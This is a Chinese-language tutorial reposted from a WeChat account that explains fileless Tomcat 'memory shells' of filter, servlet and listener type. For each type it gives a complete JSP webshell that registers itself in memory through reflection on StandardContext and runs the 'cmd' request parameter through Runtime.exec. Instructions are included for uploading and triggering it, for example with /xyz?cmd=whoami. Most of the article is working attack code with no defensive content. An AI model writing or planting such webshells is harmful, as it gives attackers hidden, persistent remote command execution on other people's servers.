> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ)

filter 型

servlet 型

listener 型

执行优先级是 listener -> filter -> servlet

filter 型内存马原理
=============

filter 是 javaweb 中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以在 filter 中写入命令执行的恶意文件，让客户端发来的请求通过它来做命令执行。

而 filter 内存马是通过动态注册一个恶意 filter，由于是动态注册的，所以这个 filter 没有文件实体，存在于内存中，随着 tomcat 重启而消失。

一般我们把这个 filter 放在所有 filter 最前面优先执行，这样我们的请求就不会受到其他正常 filter 的干扰。

ServletContext
==============

需要动态注册 filter 就需要几个添加 filter 相关的函数，ServletContext 恰好可以满足这个条件

javax.servlet.ServletContext

ServletContext 的方法中有 addFilter、addServlet、addListener 方法，即添加 Filter、Servlet、Listener

获取 ServletContext 的方法

this.getServletContext(); this.getServletConfig().getServletContext();

ApplicationContext
==================

在 Tomcat 中 org.apache.catalina.core.ApplicationContext 中包含一个 ServletContext 接口的实现

所以需要 import 这个库，最后我们用到它获取 Context

```
<%@ page import = "org.apache.catalina.core.ApplicationContext" %>
```

filter 相关变量
===========

filterMaps 变量：包含所有过滤器的 URL 映射关系

filterDefs 变量：包含所有过滤器包括实例内部等变量

filterConfigs 变量：包含所有与过滤器对应的 filterDef 信息及过滤器实例，进行过滤器进行管理

1 <%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %> 在 tomcat 不同版本需要通过不同的库引入 FilterMap 和 FilterDef

```
<!-- tomcat 7 --><%@ page import = "org.apache.catalina.deploy.FilterMap" %><%@ page import = "org.apache.catalina.deploy.FilterDef" %>
```

```
<!-- tomcat 8/9 --><%@ page import = "org.apache.tomcat.util.descriptor.web.FilterMap" %><%@ page import = "org.apache.tomcat.util.descriptor.web.FilterDef"  %>
```

filter 型内存马实现
=============

filter 部分
=========

先通过一个简单的 filter 来看一下结构

```
package filter;import javax.servlet.*;import java.io.IOException;public class filterDemo implements Filter {    public void init(FilterConfig filterConfig) throws ServletException {        System.out.println("init filter");    }    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {        System.out.println("exec filter");        filterChain.doFilter(servletRequest,servletResponse);    }    public void destroy() {}}
```

filterDemo 中有 init、doFilter、destroy 三个重要方法

```
init()方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。
doFilter()方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理
destory()方法：在销毁Filter时自动调用
```

对我们来说，init 和 destory 不需要做什么，只需要写一个 doFilter 方法拦截需要的请求，将其参数用于 Runtime.getRuntime().exec() 做命令执行，并将返回的数据打印到 Response 中即可，如下例：

```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {     String cmd = servletRequest.getParameter("cmd");     if (cmd!= null) {         Process process = Runtime.getRuntime().exec(cmd);         java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                 new java.io.InputStreamReader(process.getInputStream()));         StringBuilder stringBuilder = new StringBuilder();         String line;         while ((line = bufferedReader.readLine()) != null) {             stringBuilder.append(line + '\n');         }         servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());         servletResponse.getOutputStream().flush();         servletResponse.getOutputStream().close();         return;     }     filterChain.doFilter(servletRequest, servletResponse); }
```

动态注册部分
======

filter 部分写好，下一步就是实现将其注入到内存中

```
//从org.apache.catalina.core.ApplicationContext反射获取context方法ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField("context");appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField("context");stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");Configs.setAccessible(true);Map filterConfigs = (Map) Configs.get(standardContext);String name = "filterDemo";//判断是否存在filterDemo这个filter，如果没有则准备创建if (filterConfigs.get(name) == null){    //定义一些基础属性、类名、filter名等    filterDemo filter = new filterDemo();    FilterDef filterDef = new FilterDef();    filterDef.setFilterName(name);    filterDef.setFilterClass(filter.getClass().getName());    filterDef.setFilter(filter);        //添加filterDef    standardContext.addFilterDef(filterDef);        //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*    FilterMap filterMap = new FilterMap();    // filterMap.addURLPattern("/*");    filterMap.addURLPattern("/xyz");    filterMap.setFilterName(name);    filterMap.setDispatcher(DispatcherType.REQUEST.name());        //添加我们的filterMap到所有filter最前面    standardContext.addFilterMapBefore(filterMap);        //反射创建FilterConfig，传入standardContext与filterDef    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);    constructor.setAccessible(true);    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);        //将filter名和配置好的filterConifg传入    filterConfigs.put(name,filterConfig);    out.write("Inject success!");    }else{    out.write("Injected!");}
```

完整内存马
=====

最终 jsp 文件, 只需传到 tomcat 目录并访问一次，然后再访问其 jsp 文件../xyz?cmd=whoami 即可

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %><%@ page import = "org.apache.catalina.Context" %><%@ page import = "org.apache.catalina.core.ApplicationContext" %><%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %><%@ page import = "org.apache.catalina.core.StandardContext" %><!-- tomcat 8/9 --><!-- page import = "org.apache.tomcat.util.descriptor.web.FilterMap"page import = "org.apache.tomcat.util.descriptor.web.FilterDef" --><!-- tomcat 7 --><%@ page import = "org.apache.catalina.deploy.FilterMap" %><%@ page import = "org.apache.catalina.deploy.FilterDef" %><%@ page import = "javax.servlet.*" %><%@ page import = "java.io.IOException" %><%@ page import = "java.lang.reflect.Constructor" %><%@ page import = "java.lang.reflect.Field" %><%@ page import = "java.util.Map" %><%    class filterDemo implements Filter {        @Override        public void init(FilterConfig filterConfig) throws ServletException {        }        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {            String cmd = servletRequest.getParameter("cmd");            if (cmd!= null) {                Process process = Runtime.getRuntime().exec(cmd);                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                        new java.io.InputStreamReader(process.getInputStream()));                StringBuilder stringBuilder = new StringBuilder();                String line;                while ((line = bufferedReader.readLine()) != null) {                    stringBuilder.append(line + '\n');                }                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());                servletResponse.getOutputStream().flush();                servletResponse.getOutputStream().close();                return;            }            filterChain.doFilter(servletRequest, servletResponse);        }        @Override        public void destroy() {        }    }%><%    //从org.apache.catalina.core.ApplicationContext反射获取context方法    ServletContext servletContext =  request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField("context");    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField("context");    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");    Configs.setAccessible(true);    Map filterConfigs = (Map) Configs.get(standardContext);    String name = "filterDemo";//判断是否存在filterDemo1这个filter，如果没有则准备创建    if (filterConfigs.get(name) == null){        //定义一些基础属性、类名、filter名等        filterDemo filter = new filterDemo();        FilterDef filterDef = new FilterDef();        filterDef.setFilterName(name);        filterDef.setFilterClass(filter.getClass().getName());        filterDef.setFilter(filter);        //添加filterDef        standardContext.addFilterDef(filterDef);        //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*        FilterMap filterMap = new FilterMap();        // filterMap.addURLPattern("/*");        filterMap.addURLPattern("/xyz");        filterMap.setFilterName(name);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        //添加我们的filterMap到所有filter最前面        standardContext.addFilterMapBefore(filterMap);        //反射创建FilterConfig，传入standardContext与filterDef        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);        constructor.setAccessible(true);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);        //将filter名和配置好的filterConifg传入        filterConfigs.put(name,filterConfig);        out.write("Inject success!");    }    else{        out.write("Injected!");    }%>
```

使用示例

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic42FHOSIJWOTiaia47NSlEhwmLoiaDiajXUZUD7QN6IFDZLM90KavjD9h6icw/640?wx_fmt=png)

如果在当前 web 根目录则不需要寻找上一级目录

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4eLXficyiaLgyzHGHfZnGDoQePnTlOpn8ksT6EauwRicMrkic0qZwhlOaYQ/640?wx_fmt=png)

Servlet 型内存马实现 Servlet 部分 一个简单的 servlet

```
public class ServletDemo implements Servlet {        //当Servlet第一次被创建对象时执行该方法,该方法在整个生命周期中只执行一次    public void init(ServletConfig arg0) throws ServletException {        System.out.println("init");    }    //对客户端响应的方法,该方法会被执行多次，每次请求该servlet都会执行该方法    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {        System.out.println("service");    }    //当Servlet被销毁时执行该方法    public void destroy() {        System.out.println("destroy");    }        //当停止tomcat时销毁servlet。    public ServletConfig getServletConfig() {        return null;    }    public String getServletInfo() {        return null;    }}
```

类比 filter，在 filter 型中我们需要在 doFilter 方法中填入恶意代码

在 servlet 中，我们需要在 service 方法中填入恶意代码，每次访问就会触发命令执行。

在 service 填入 RuntimeExec 和回显的部分，这个 servlet 就变成了进行命令执行的木马

```
class ServletDemo implements Servlet{        @Override    public void init(ServletConfig config) throws ServletException {}    @Override    public String getServletInfo() {return null;}    @Override    public void destroy() {}    public ServletConfig getServletConfig() {return null;}    @Override    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {        String cmd = servletRequest.getParameter("cmd");        if (cmd != null) {            Process process = Runtime.getRuntime().exec(cmd);            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                    new java.io.InputStreamReader(process.getInputStream()));            StringBuilder stringBuilder = new StringBuilder();            String line;            while ((line = bufferedReader.readLine()) != null) {                stringBuilder.append(line + '\n');            }            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());            servletResponse.getOutputStream().flush();            servletResponse.getOutputStream().close();            return;        }    }}
```

动态注册部分
======

获取 context 部分与 filter 中相同, 仍然从 org.apache.catalina.core.ApplicationContext 反射获取

```
ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField("context");appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField("context");stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

然后这次需要将上文写的 servlet 封装成 wrapper 再使用 context 添加

```
//将恶意servlet封装成wrapper添加到StandardContext的children当中ServletDemo demo = new ServletDemo();org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper();demoWrapper.setName("xyz");demoWrapper.setLoadOnStartup(1);demoWrapper.setServlet(demo);demoWrapper.setServletClass(demo.getClass().getName());standardContext.addChild(demoWrapper);//设置ServletMap将访问的URL和wrapper进行绑定standardContext.addServletMapping("/xyz", "xyz");out.println("inject servlet success!");
```

servlet 型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的 url 才能触发

完整内存马
=====

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %><%@ page import = "org.apache.catalina.core.ApplicationContext"%><%@ page import = "org.apache.catalina.core.StandardContext"%><%@ page import = "javax.servlet.*"%><%@ page import = "java.io.IOException"%><%@ page import = "java.lang.reflect.Field"%><%    class ServletDemo implements Servlet{        @Override        public void init(ServletConfig config) throws ServletException {}        @Override        public String getServletInfo() {return null;}        @Override        public void destroy() {}    public ServletConfig getServletConfig() {return null;}        @Override        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {            String cmd = servletRequest.getParameter("cmd");            if (cmd != null) {                Process process = Runtime.getRuntime().exec(cmd);                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(                        new java.io.InputStreamReader(process.getInputStream()));                StringBuilder stringBuilder = new StringBuilder();                String line;                while ((line = bufferedReader.readLine()) != null) {                    stringBuilder.append(line + '\n');                }                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());                servletResponse.getOutputStream().flush();                servletResponse.getOutputStream().close();                return;            }        }    }%><%    ServletContext servletContext =  request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField("context");    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField("context");    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    ServletDemo demo = new ServletDemo();    org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper();//设置Servlet名等    demoWrapper.setName("xyz");    demoWrapper.setLoadOnStartup(1);    demoWrapper.setServlet(demo);    demoWrapper.setServletClass(demo.getClass().getName());    standardContext.addChild(demoWrapper);//设置ServletMap    standardContext.addServletMapping("/xyz", "xyz");    out.println("inject servlet success!");%>
```

使用示例

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4icoLJNNQxamfrJjGibibyrianuwHZJ7y0XQ0JCjAmzmwEOWMwZd7sqiaIiaQ/640?wx_fmt=png)

如果在当前 web 根目录则不需要寻找上一级目录

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4icqu5Ia55Y0YcDu5fBTjeHkGmxOAcNRMv4ia9Sduia7lpUQZjv3lKbfiag/640?wx_fmt=png)

Listener 型内存马原理
===============

Listener 是 javaweb 中的监听器，监听某一个 java 对象的方法调用或属性改变，当被监听对象发生上述事件后，监听器某个方法立即被执行。

Listener 内存马是通过动态注册一个 Listener，其监听到某个参数传入时，则将参数用于命令执行，由于是动态注册的，所以这个 Listener 没有文件实体，存在于内存中，随着 tomcat 重启而消失。

Listener 型内存马实现
===============

Listener 部分
===========

一个简单的 HttpServletRequestListener 示例

```
class S implements ServletRequestListener{    @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) {        System.out.println("Initialized.");            }    @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {        System.out.println("Destroyed.");    }}
```

在 Listener 中，我们需要在初始化操作 contextInitialized 中填入恶意代码

```
class S implements ServletRequestListener{    @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {            }    @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) {        String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");        if(cmd != null){            try {                Runtime.getRuntime().exec(cmd);            } catch (IOException e) {}        }    }}
```

动态注册部分
======

获取 context 部分

```
ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField("context");appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField("context");stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

添加 Listener

```
S servletRequestListener = new S();
standardContext.addApplicationEventListener(servletRequestListener);
```

完整内存马

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %><%@ page import="org.apache.catalina.core.ApplicationContext" %><%@ page import="org.apache.catalina.core.StandardContext" %><%@ page import="javax.servlet.*" %><%@ page import="javax.servlet.annotation.WebServlet" %><%@ page import="javax.servlet.http.HttpServlet" %><%@ page import="javax.servlet.http.HttpServletRequest" %><%@ page import="javax.servlet.http.HttpServletResponse" %><%@ page import="java.io.IOException" %><%@ page import="java.lang.reflect.Field" %><%class S implements ServletRequestListener{    @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {            }    @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) {        String cmd = servletRequestEvent.getServletRequest().getParameter("cmd");        if(cmd != null){            try {                Runtime.getRuntime().exec(cmd);            } catch (IOException e) {}        }    }}%><%ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField("context");appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField("context");stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);S servletRequestListener = new S();standardContext.addApplicationEventListener(servletRequestListener);out.println("inject success");%>
```

使用示例

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4v8n7OmIaea9XYh17f9M6icibGL2MibPuZz0AQ9CMMUlCDwwuYRe9c2M9w/640?wx_fmt=png)

如果在当前 web 根目录则不需要寻找上一级目录

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4ibbHxJzu6Nh8dr7ayBzIXkGyd5L1Ys2w59s4UONNmH7LxzLUBJnaO8w/640?wx_fmt=png)

作者：Leticia's Blog ，详情点击阅读原文。

**推荐阅读**[**![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247496904&idx=1&sn=e6c717bc2709f7c4ec8523bc681f43f3&chksm=9acd2457adbaad4169ed38ebf0d969553b6cf4dee26307f2ce6a137c52849e4ffdf06325347e&scene=21#wechat_redirect)  

公众号

**觉得不错点个 **“赞”**、“在看”，支持下小编****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**